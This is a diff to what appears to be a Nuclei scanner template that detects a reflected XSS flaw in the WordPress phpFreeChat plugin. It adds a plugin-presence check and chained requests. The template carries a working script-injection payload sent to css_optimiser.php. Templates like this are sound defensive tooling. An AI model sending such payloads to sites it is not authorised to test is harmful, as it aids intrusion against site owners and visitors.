@@ -12,11 +12,24 @@ info:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
     cvss-score: 7.2
     cwe-id: CWE-79
-  tags: xss,wp-plugin,edb,wordpress
   metadata:
-    max-request: 1
+    max-request: 2
+  tags: xss,wp-plugin,edb,wordpress,vuln
+
+flow: http(1) && http(2)
 
 http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        internal: true
+        words:
+          - '/wp-content/plugins/phpfreechat/'
+
   - method: GET
     path:
       - '{{BaseURL}}/wp-content/plugins/phpfreechat/lib/csstidy-1.2/css_optimiser.php?url=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
@@ -36,5 +49,4 @@ http:
       - type: status
         status:
           - 200
-
-# Enhanced by mp on 2022/09/23
+# digest: 4a0a00473045022100ecf1c447bfd5d6215a0f82930415fbe05c46094c121aa31b240561960393941a022013dd2ad2b551f5fd26e9d080f694a7a5469968393fc5680459686838d416097f:922c64590222798bb761d5b6d8e72950
